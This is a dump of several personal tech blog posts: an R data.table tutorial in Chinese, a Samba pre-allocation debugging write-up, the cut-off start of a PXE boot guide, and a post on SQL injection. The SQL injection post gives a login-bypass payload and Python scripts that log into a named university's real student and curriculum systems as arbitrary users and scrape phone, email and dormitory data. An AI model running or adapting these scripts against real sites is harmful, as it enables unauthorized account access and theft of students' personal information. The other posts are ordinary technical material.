class=\"code\"><pre><span class=\"line\">B &lt;- as.data.table(A)</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"subset行\"><a href=\"#subset行\" class=\"headerlink\" title=\"subset行\"></a>subset行</h2><p>data.table的通用选取格式是<code>DT[i,j,k]</code>，类比sql语句的<code>select j from DT where i group by k</code><br>例1:获取六月份所有从“JFK”机场起飞的航班<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[origin == &quot;JFK&quot; &amp; month == 6L]</span><br></pre></td></tr></table></figure><br>如果是data.table，写法则如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[flights$origin == &quot;JFK&quot; &amp;&amp; flights$month == 6L,]</span><br></pre></td></tr></table></figure><br>可见：</p>\n<ul>\n<li>省略了逗号</li>\n<li>省略了前缀</li>\n</ul>\n<p>例2： 获取 flights 开头的两行<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[1:2]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h2><p>例:先按 origin列 的升序,再按 dest 的降序排列。通过R语言的基础函数<code>order()</code>来<br>完成这个功能。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[order(origin, -dest)]</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>order()</code>函数是被优化过的</li>\n<li>我们可以对字符型的列使用减号”-“来实现降序排列。</li>\n<li>函数<code>order()</code>其实调用了data.table的快速基数排序函数<code>forder()</code>,它比 <code>base::order()</code>快很多。</li>\n</ul>\n<h2 id=\"select列\"><a href=\"#select列\" class=\"headerlink\" title=\"select列\"></a>select列</h2><p>例1:选取 arr_delay 列,返回值是向量。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, arr_delay]</span><br></pre></td></tr></table></figure></p>\n<p>例2:选取 arr_delay 列,返回值是data.table<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, list(arr_delay)]</span><br></pre></td></tr></table></figure><br>用list将变量包起来，返回的则是data.table，也可以用list的别名简写为：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, .(arr_delay)]</span><br></pre></td></tr></table></figure><br>如果选取多个列，则返回必须是data.table，所以用list封装变量考虑到了这一点。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, .(arr_delay, dep_delay)]</span><br></pre></td></tr></table></figure></p>\n<p>列重命名功能：选取arr_delay列和dep_delay列,并把列名改为delay_arr和delay_dep。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, .(delay_arr = arr_delay,delay_dep = dep_delay)]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"在参数j中计算\"><a href=\"#在参数j中计算\" class=\"headerlink\" title=\"在参数j中计算\"></a>在参数j中计算</h2><p>例1：有多少航班没有延误<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[,sum(arr_delay+dep_delay&lt;0)]</span><br></pre></td></tr></table></figure><br>j除了能select还能处理表达式，即对列的计算，如果这样：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[,arr_delay+dep_delay&lt;0]</span><br></pre></td></tr></table></figure><br>则返回一个布尔类型的向量，<code>SUM()</code>处理一个布尔向量，则返回TRUE的数目</p>\n<p>例2:在六月份,从”JFK”机场起飞的航班中,计算起飞和到达的平均延误时间。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[origin == &quot;JFK&quot; &amp; month == 6L, .(m_arr=mean(arr_delay), m_dep=mean(dep_delay))]</span><br></pre></td></tr></table></figure></p>\n<p>例3:在六月份,从”JFK”机场起飞的航班一共有多少?<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[origin == &quot;JFK&quot; &amp; month == 6L, length(dest)]</span><br></pre></td></tr></table></figure><br>j中<code>length()</code>传入任意一个参数即可，所以还有一种简要的写法：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[origin == &quot;JFK&quot; &amp; month == 6L, .N]</span><br></pre></td></tr></table></figure></p>\n<p>例3:用data.frame的方式,选取arr_delay和dep_delay两列。（不写with参数也可）<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, c(&quot;arr_delay&quot;, &quot;dep_delay&quot;), with=FALSE]</span><br></pre></td></tr></table></figure><br> – 参数 with是根据 R里面的函数 with() 演变而来的。在data.table里,我们设置 <code>with=FALSE</code>,使得我们不能再像变量一样引用列了。<br> – 等价于:<code>flights[, .(arr_delay, dep_delay)]</code><br>我们还可以使用 <code>-</code> 或 <code>!</code> 来排除列。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, !c(&quot;arr_delay&quot;, &quot;dep_delay&quot;), with=FALSE]</span><br><span class=\"line\">#or</span><br><span class=\"line\">ans &lt;- flights[, -c(&quot;arr_delay&quot;, &quot;dep_delay&quot;), with=FALSE]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"聚合\"><a href=\"#聚合\" class=\"headerlink\" title=\"聚合\"></a>聚合</h2><p>例:如何获取每个机场起飞的航班数?<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, .(.N), by=.(origin)]</span><br></pre></td></tr></table></figure></p>\n<p>例:如何获取美航在所有机场的起/降的数目?<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[carrier == &quot;AA&quot;, .N, by=.(origin,dest)]</span><br></pre></td></tr></table></figure><br>by分组可以接受多个列</p>\n<h2 id=\"keyby\"><a href=\"#keyby\" class=\"headerlink\" title=\"keyby\"></a>keyby</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[carrier == &quot;AA&quot;, .(mean(arr_delay),</span><br><span class=\"line\">mean(dep_delay)), keyby=.(origin, dest, month)]</span><br></pre></td></tr></table></figure>\n<p>把by改为了keyby。这会自动的将结果按照升序排列。注意<code>keyby()</code>是在数据操作完成后才进行。</p>\n<h2 id=\"chaining表达式\"><a href=\"#chaining表达式\" class=\"headerlink\" title=\"chaining表达式\"></a>chaining表达式</h2><p>例:美航在所有机场的起/降的数目,并让结果按origin的升序、按dest的降序排列。按照之前知识,可以这样用两条语句做:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[carrier == &quot;AA&quot;, .N, by = .(origin, dest)]</span><br><span class=\"line\">ans &lt;- ans[order(origin, -dest)]</span><br></pre></td></tr></table></figure><br>但是这么做会生成一个临时变量。可以通过添加chaining表达式,避免生成临时变量。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[carrier == &quot;AA&quot;, .N, by=.(origin, dest)][order(origin, -dest)]</span><br></pre></td></tr></table></figure><br>我们可以一个接一个地添加表达式,做一系列操作,就像<code>DT[...][...][...]...</code></p>\n<h2 id=\"by表达式\"><a href=\"#by表达式\" class=\"headerlink\" title=\"by表达式\"></a>by表达式</h2><p>例:有多少航班起飞延误并且到达延误?有多少航班起飞延误和到达没延误……<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, .N, .(dep_delay&gt;0, arr_delay&gt;0)]</span><br></pre></td></tr></table></figure><br>说明by中也可以是表达式</p>\n<p>如果根据ID每一列都要求平均，那就是：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DT[,.(mean(col1),mean(col2),mean(col3),mean(col4)), by=ID]</span><br></pre></td></tr></table></figure><br>写法复杂，如果对于每一列都应用相同的函数，则可以写成如下形式：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DT[, lapply(.SD, mean), by=ID]</span><br></pre></td></tr></table></figure><br>其中<code>.SD</code>包含了所有列，如果需要指定那些列统一应用函数，可以这样：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[carrier == &quot;AA&quot;, lapply(.SD, mean), by=.(origin,</span><br><span class=\"line\">dest, month), .SDcols=c(&quot;arr_delay&quot;, &quot;dep_delay&quot;)]</span><br></pre></td></tr></table></figure><br>表示<code>.SD</code>中只设置了arr_delay和dep_delay两列。</p>\n<p>返回每个月的前两行：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ans &lt;- flights[, head(.SD, 2), by=month]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"语义引用\"><a href=\"#语义引用\" class=\"headerlink\" title=\"语义引用\"></a>语义引用</h2><p><code>data.table</code>的语义引用，允许通过引用reference来add/update/delete列</p>\n<ul>\n<li>a.左右等式的形式<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DT[, c(&quot;colA&quot;, &quot;colB&quot;, ...) := list(valA, valB, ...)]qq()</span><br><span class=\"line\">DT[, colA := valA] #只有一列时</span><br></pre></td></tr></table></figure></li>\n<li>b.函数形式<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DT[, `:=`(colA = valA, # valA is assigned to colA</span><br><span class=\"line\">   colB = valB, # valB is assigned to colB</span><br><span class=\"line\">   ...</span><br><span class=\"line\">)]</span><br></pre></td></tr></table></figure>\n<strong>注意:我们没有把运算的结果赋值给一个变量.因为完全没必要。因为我们直接更新了data.table</strong></li>\n</ul>\n<p>例1:对每次航班,添加 speed (km/hr) 和 delay (minutes) 两列。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[, `:=`(speed = distance / (air_time/60),</span><br><span class=\"line\">delay = arr_delay + dep_delay)]</span><br></pre></td></tr></table></figure><br>通过给不存在的列赋值则会添加新列</p>\n<p>例2:追加一列,用来保存某对起飞/到达机场间的最快飞行速度。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[, max_speed := max(speed), by=.(origin,dest)]</span><br></pre></td></tr></table></figure></p>\n<p>例3:删除 delay列<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[, `:=`(delay = NULL)]</span><br></pre></td></tr></table></figure><br>给已存在的列赋NULL则会删除列</p>\n<p>例4：更新hour列，把24点变为0点<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[hour == 24L, hour := 0L] </span><br></pre></td></tr></table></figure><br><code>:=</code>操作没有返回值，产看运行结果可以末尾加一个<code>[]</code>:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[hour == 24L, hour := 0L][]</span><br></pre></td></tr></table></figure></p>\n<p>例5:再追加两列,用于保存每个月的最大起飞延误时间和到达延误时间。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">in_cols = c(&quot;dep_delay&quot;, &quot;arr_delay&quot;)</span><br><span class=\"line\">out_cols = c(&quot;max_dep_delay&quot;, &quot;max_arr_delay&quot;)</span><br><span class=\"line\">flights[, c(out_cols) := lapply(.SD, max), by = month, .SDcols = in_cols]</span><br></pre></td></tr></table></figure><br>为了更好的可读性,这里使用了左右等式，<code>c()</code>不可省略,否则语法上就变成单个对象赋值了。</p>\n<h2 id=\"的副作用\"><a href=\"#的副作用\" class=\"headerlink\" title=\":=的副作用\"></a><code>:=</code>的副作用</h2><p>操作符<code>:=</code>会更新原数据。当我们不想新原数据时,可以用函数<code>copy()</code></p>\n<p>例:想创建一个函数,用于返回每个月的最快速度。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">foo &lt;- function(DT) &#123;</span><br><span class=\"line\">DT[, speed := distance / (air_time/60)]</span><br><span class=\"line\">DT[, .(max_speed = max(speed)), by=month]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ans = foo(flights)</span><br></pre></td></tr></table></figure></p>\n<p>此时flights被增加了speed列,但没有max_speed列希望使用操作符“:=”的功能,但是不想改变原数据,可以用函数<code>copy()</code>来做到这一点。函数<code>copy()</code>对输入参数进行深度拷贝,因此对副本做的所有更新操作,都不会对原数据生效。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flights[, speed := NULL]</span><br><span class=\"line\">foo &lt;- function(DT) &#123;</span><br><span class=\"line\">DT &lt;- copy(DT) # deep copy</span><br><span class=\"line\">DT[, speed := distance / (air_time/60)] #不会修改flights</span><br><span class=\"line\">DT[, .(max_speed = max(speed)), by=month]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ans &lt;- foo(flights)</span><br></pre></td></tr></table></figure>\n<h2 id=\"主键，基于二分搜索的subset\"><a href=\"#主键，基于二分搜索的subset\" class=\"headerlink\" title=\"主键，基于二分搜索的subset\"></a>主键，基于二分搜索的subset</h2>","categories":["R语言学习"],"tags":["R语言"]},{"title":"SQL注入初探","url":"/2018/01/01/SQL%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/","content":"<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>\n<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a>发现</h2><p>在<a href=\"http://mathe.neu.edu.cn/\">NEUMathe</a>的登陆表单内输入了‘，没有正常的显示登陆失败，而是弹出以下界面:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">### Error querying database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near at line 2 ### The error may exist in ssm/mapper/StudentMapperCustom.xml ### The error may involve ssm.mapper.StudentMapperCustom.checkStudentExits-Inline ### The error occurred while setting parameters ### SQL: SELECT * FROM Student WHERE Code = and Pwd =</span><br></pre></td></tr></table></figure>\n<p>很明显，这是数据库错误的提示信息，注意到这一行，<br><code>SELECT * FROM Student WHERE Code =  and Pwd =</code><br>服务器把单引号传入sql语句中导致这句查询执行错误，于是，找到注入点，输入<code>2016xxxx&#39; or &#39;1&#39;=&#39;1</code>,此时，原来正常的语句由<code>select * from student where code = &#39;2016xxxx&#39; and pwd = &#39;xxxx&#39;</code>变<br>成了<code>select * from student where code = &#39;2016xxxx&#39; or &#39;1&#39;=&#39;1&#39; and pwd = &#39;xxxx&#39;</code>，点击登陆，居然能成功登陆，pwd密码项被or后面一个恒等式架空了，于是这个语句恒为真，即可以登陆任何人的&gt;账号。</p>\n<span id=\"more\"></span>\n<h2 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h2><p>这个漏洞导致可以登陆所有人的账户，首先带来的后果是信息的泄漏，使用python模拟登陆<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">userpass = &quot;anypass&quot;</span><br><span class=\"line\">tiku = &quot;GS&quot; #GS GL FB XD 选择科目</span><br><span class=\"line\">sso = &quot;2016xxxx&quot; #sso number</span><br><span class=\"line\"></span><br><span class=\"line\">login_data = &#123;&quot;username&quot;:sso+&quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;, &quot;userpass&quot;:userpass,&quot;tiku&quot;:tiku&#125;</span><br><span class=\"line\">url = &#x27;http://mathe.neu.edu.cn/login&#x27;</span><br><span class=\"line\">headers = &#123;&quot;User_Agent&quot; : &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;&#125;</span><br><span class=\"line\">t = requests.post(url, data = login_data, headers = headers)</span><br><span class=\"line\">print t.text</span><br></pre></td></tr></table></figure><br>进一步，可以获得cookies，抓取个人信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\"># -*- coding: UTF-8 -*-</span><br><span class=\"line\">import urllib</span><br><span class=\"line\">import urllib2</span><br><span class=\"line\">import cookielib</span><br><span class=\"line\"></span><br><span class=\"line\">filename = &#x27;cookie.txt&#x27;</span><br><span class=\"line\">userpass = &quot;anypass&quot;</span><br><span class=\"line\">tiku = &quot;GS&quot; #GS GL FB XD</span><br><span class=\"line\">sso = &quot;20165000&quot; #sso number</span><br><span class=\"line\"></span><br><span class=\"line\">#声明一个MozillaCookieJar对象实例来保存cookie，之后写入文件</span><br><span class=\"line\">cookie = cookielib.MozillaCookieJar(filename)</span><br><span class=\"line\">opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class=\"line\">postdata = urllib.urlencode(&#123;&quot;username&quot;:sso+&quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;, &quot;userpass&quot;:userpass,&quot;tiku&quot;:tiku&#125;)</span><br><span class=\"line\">#登录教务系统的URL</span><br><span class=\"line\">loginUrl = &#x27;http://mathe.neu.edu.cn/login&#x27;</span><br><span class=\"line\">#模拟登录，并把cookie保存到变量</span><br><span class=\"line\">result = opener.open(loginUrl,postdata)</span><br><span class=\"line\">#保存cookie到cookie.txt中</span><br><span class=\"line\">cookie.save(ignore_discard=True, ignore_expires=True)</span><br><span class=\"line\">#利用cookie请求访问另一个网址，此网址是成绩查询网址</span><br><span class=\"line\">gradeUrl = &#x27;http://mathe.neu.edu.cn/main/finduserbyid&#x27;</span><br><span class=\"line\">#请求访问成绩查询网址</span><br><span class=\"line\">result = opener.open(gradeUrl)</span><br><span class=\"line\">print result.read()</span><br></pre></td></tr></table></figure>\n<p>代码返回一个包含个人手机 邮箱 宿舍信息的json。<br>更可怕的是，该系统数据库的密码存储使用明文，对于sql注入的进一步操作可以爬去整个数据表，用过社会工程学推测学校学生的其他账号密码。<br>该漏洞极其危险，然而，笔者经过尝试，发现了培养计划平台也有相同问题，可以模拟登陆，修改信息，抓取培养计划：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">userlb = 1</span><br><span class=\"line\">planyear = 2016</span><br><span class=\"line\">username = &quot;2016xxxx&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span><br><span class=\"line\">password = 1</span><br><span class=\"line\">x = 28</span><br><span class=\"line\">y = 14</span><br><span class=\"line\"></span><br><span class=\"line\">#http://202.118.27.146/plan/</span><br><span class=\"line\"></span><br><span class=\"line\">login_data = &#123;&quot;userlb&quot;:userlb,&quot;planyear&quot;:planyear,&quot;username&quot;:username,&quot;password&quot;:password,&quot;x&quot;:x,&quot;y&quot;:y&#125;</span><br><span class=\"line\">url = &#x27;http://202.118.27.146/plan/LoginServlet&#x27;</span><br><span class=\"line\">headers = &#123;&quot;User_Agent&quot; : &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;&#125;</span><br><span class=\"line\">t = requests.post(url, data = login_data, headers = headers)</span><br><span class=\"line\">print t.text</span><br></pre></td></tr></table></figure>\n","tags":["网络安全"]},{"title":"Samba拷贝文件的pre-allowcate机制","url":"/2021/03/29/Samba%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6%E7%9A%84pre-allowcate%E6%9C%BA%E5%88%B6/","content":"<p>最近的项目出现了samba的文件拷贝的BUG，项目主要流程是：windows端通过samba协议拷贝一个文件夹到Linux的samba server上，Linux的samba server所在节点运行着一个Python程序，它监听者文件大小的变化，一旦文件夹大小60秒不变，就判断文件上传完成，开始对文件进行处理。</p>\n<p>起初上传包含大量小文件的文件夹并没有出现问题，但是传大文件（压缩包）的时候，会发现文件损坏无法解压。起初我以为是压缩包太大，多个任务的压缩包一起解压造成内存不够，于是设置了失败重新解压的机制。但是后来发现实际上一个大文件也会造成解压失败，日志显示重新解压了几百次，还是失败。之后又是设计解压重试时间间隔，还是失败。于是把传上去解压失败的压缩包拷贝到本地，发现打不开，文件真的损坏了！于是突发奇想，用Hex Editor查看了一下文件结构：<br><img src=\"2.png\" alt=\"\"></p>\n<span id=\"more\"></span>\n<p>一看果然大有猫腻，前面部分数据是正常的，而后半部分全是<code>00</code><br><img src=\"1.png\" alt=\"\"><br>我忽然就意识到这是文件没有传完，于是用<code>smbstatus</code>命令查看了samba服务状态，果然文件还被占用着，说明拷贝并未结束：<br><img src=\"3.png\" alt=\"\"></p>\n<p>再次对比了本机的正常压缩包和损坏的压缩包，发现大小竟然也一致。结合文件尾部的<code>00</code>，说明文件可能是先分配空白空间，再顺序写入的，所以大文件的拷贝会很长时间都不会发生大小变化，让Python程序误以为上传已经完成。为了验证这个猜想，我又准备了一个40G左右的压缩包<code>test.jar</code>，用以下程序试试输出文件大小：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">size = <span class=\"number\">0</span></span><br><span class=\"line\">tictok = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    new_size = os.path.getsize(<span class=\"string\">&quot;test.rar&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> new_size &gt; size:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;size changed from &#123;0&#125; to &#123;1&#125;&quot;</span>.<span class=\"built_in\">format</span>(size, new_size))</span><br><span class=\"line\">        size = new_size</span><br><span class=\"line\">        tictok = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;size remain unchanged for &#123;0&#125; sec&quot;</span>.<span class=\"built_in\">format</span>(tictok))</span><br><span class=\"line\">        tictok += <span class=\"number\">2</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<p>上传文件后立刻启动脚本，打出的日志如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">size changed from 0 to 43234952351</span><br><span class=\"line\">size remain unchanged for 0 sec</span><br><span class=\"line\">size remain unchanged for 2 sec</span><br><span class=\"line\">size remain unchanged for 4 sec</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure><br>日志显示从第一秒文件大小就已经是43234952351字节（42G），之后文件大小从没变过，说明：<strong>samba拷贝文件的过程存在某种预分配（pre-allowcate）策略</strong>。</p>\n<p>查到Samba的拷贝机支持确实如此：<a href=\"https://wiki.samba.org/index.php/Linux_Performance\">https://wiki.samba.org/index.php/Linux_Performance</a>，预分配可以有效减少碎片化问题。</p>\n<p>是否只是samba的拷贝文件存在这只机制呢？再Linux上用<code>copy</code>命令从其他目录拷贝文件到当前目录，Python监听文件大小变化的日志如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">size changed from 0 to 121765888</span><br><span class=\"line\">size changed from 121765888 to 386793472</span><br><span class=\"line\">size changed from 386793472 to 650248192</span><br><span class=\"line\">size changed from 650248192 to 915275776</span><br><span class=\"line\">size changed from 915275776 to 1179254784</span><br><span class=\"line\">size changed from 1179254784 to 1440612352</span><br><span class=\"line\">size changed from 1440612352 to 1705377792</span><br><span class=\"line\">size changed from 1705377792 to 1969356800</span><br><span class=\"line\">size changed from 1969356800 to 2234384384</span><br><span class=\"line\">size changed from 2234384384 to 2499149824</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure><br>文件不再是从一开始就固定大小的了。同理测试windows：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">size changed from 0 to 43234952351</span><br><span class=\"line\">size remain unchanged for 0 sec</span><br><span class=\"line\">size remain unchanged for 2 sec</span><br><span class=\"line\">size remain unchanged for 4 sec</span><br><span class=\"line\">size remain unchanged for 6 sec</span><br><span class=\"line\">size remain unchanged for 8 sec</span><br><span class=\"line\">size remain unchanged for 10 sec</span><br></pre></td></tr></table></figure><br>文件大小也是复制时就预先分配好的！说明文件的复制策略也许和平台/文件系统相关。Ext4采用的Extending Allocate策略相对于NTFS的Preallocate更容易产生碎片化问题。</p>\n<p>连续分配的好处是会让分配的block较为集中，减少机械硬盘寻道的时间。</p>\n<blockquote>\n<p>参考文献</p>\n<ul>\n<li><a href=\"https://www.systutorials.com/docs/linux/man/8-vfs_prealloc/\">https://www.systutorials.com/docs/linux/man/8-vfs_prealloc/</a></li>\n<li><a href=\"https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html\">https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html</a></li>\n<li><a href=\"https://linux.cn/article-10000-1.html?pr\">https://linux.cn/article-10000-1.html?pr</a></li>\n<li><a href=\"https://blog.csdn.net/younger_china/article/details/22827341\">https://blog.csdn.net/younger_china/article/details/22827341</a></li>\n<li><a href=\"https://baijiahao.baidu.com/s?id=1626865145881274269&amp;wfr=spider&amp;for=pc\">https://baijiahao.baidu.com/s?id=1626865145881274269&amp;wfr=spider&amp;for=pc</a></li>\n<li><a href=\"https://blog.csdn.net/tongyijia/article/details/52832236\">https://blog.csdn.net/tongyijia/article/details/52832236</a></li>\n<li><a href=\"https://samba-technical.samba.narkive.com/ceHg4eiL/preallocated-file-size\">https://samba-technical.samba.narkive.com/ceHg4eiL/preallocated-file-size</a></li>\n</ul>\n</blockquote>\n","tags":["Linux"]},{"title":"Setup a PXE server for live Linux","url":"/2024/04/16/Setup-a-PXE-server-for-live-Linux/","content":"<p>I wrote a blog <em><a href=\"Custom-your-Linux-live-CD-with-linux-live\">Custom your Linux live CD using linux-live</a></em> two months ago, explaning how to make a “live Linux CD” to provide user with a rescue OS for recovering the corrupted system data. Our business recently came up with a new need to simplify this process: let users boot directly from the network without the hassle of creating a liveCD or liveUSB from the ISO image. To archieve this goal, we need to use a technology called PXE.</p>\n<p><em>PXE</em> stands for <em>Preboot Execution Environment</em>. It’s a standardized client-server architecture that allows a computer to boot and run software even if there is no operating system installed on the local hard drive. PXE is commonly used in enterprise environments for tasks like operating system deployment, diskless booting, and remote troubleshooting. It’s particularly useful for large-scale deployments where manually installing or updating operating systems on individual machines would be impractical.</p>\n<blockquote>\n<p>The first time I was exposed to this technology was when I was participating in the ACM competition in college. As the organizer of the competition, our school installed Ubuntu in batches on hundreds of computers in the competition venue at the same time. This gave me a huge shock because it’s so efficient that I feel like it’s like magic. It took me a long time to realize that this was PXE boot. Only one PXE server and a LAN are needed to initialize hundreds of computers at the same time.</p>\n</blockquote>\n<p>In this article I will show you how to boot from the Linux live OS via network and unravel the mysteries of PXE. I assume you have some baisc knowledge on Linux boot process. If you are not familiar with it, I recommend you to read this article I wrote before : <a href=\"/2024/02/25/How-Linux-Boots/\">How Linux Boots</a>.</p>\n<h2 id=\"How-PXE-works\"><a href=\"#How-PXE-works\" class=\"headerlink\" title=\"How PXE works\"></a>How PXE works</h2><p>Here’s how PXE typically works:</p>\n<p><img src=\"Screenshot_20240419_191544.png\" alt=\"\"></p>\n<p><strong>PXE Client</strong> is The computer that needs to boot from the network (i.e., the one without a valid local operating system). The client computer’s network interface card (NIC) must support PXE. Most modern NICs have PXE support built-in. When a PXE-capable client boots up, it sends out a special <strong>DHCP</strong> (<em>Dynamic Host Configuration Protocol</em>) request on the network. The DHCP server responds with the IP address of a PXE server and the location of the boot file. The client then downloads the boot file using <strong>TFTP</strong> (<em>Trivial File Transfer Protocol</em>) and executes it. This boot file typically contains a bootloader such as GRUB or SYSLINUX, which can then load an operating system image over the network.</p>\n<span id=\"more\"></span>\n<p>Here’s a detailed sequence diagram explaning the process on how PXE server interact with TFTP server, DHCP server and HTTP sever.</p>\n<pre class=\"mermaid\">sequenceDiagram\n  participant PXE-Client\n  participant TFTP-Server\n  participant DHCP-Server\n  participant HTTP-Server\n\n  PXE-Client->>DHCP-Server: Request IP Address\n  DHCP-Server->>PXE-Client: Return IP Address of TFTP Server and the location of bootstrap file (pxelinux.0)\n  PXE-Client->>TFTP-Server: Request bootstrap file (pxelinux.0)\n  TFTP-Server->>PXE-Client: Transfer bootstrap file (pxelinux.0)\n  PXE-Client->>PXE-Client: Execute bootstrap (pxelinux.0), request configuration file (pxelinux.cfg)\n  PXE-Client->>PXE-Client: Load PXE configuration files\n  PXE-Client->>PXE-Client: User select boot menu entry\n  PXE-Client->>TFTP-Server: Request Linux kernel (vmlinuz), initramfs\n  TFTP-Server->>PXE-Client: Transfer Linux kernel (vmlinuz), initramfs\n  PXE-Client->>TFTP-Server: Load and run Linux kernel with specified kernel arguments in PXE configuration\n  PXE-Client->>HTTP-Server: Request other data (*.rpm, *.iso) via HTTP\n  HTTP-Server->>PXE-Client: Response data</pre>\n\n<p>After the bootloader (i.e., GRUB or SYSLINUX) load the 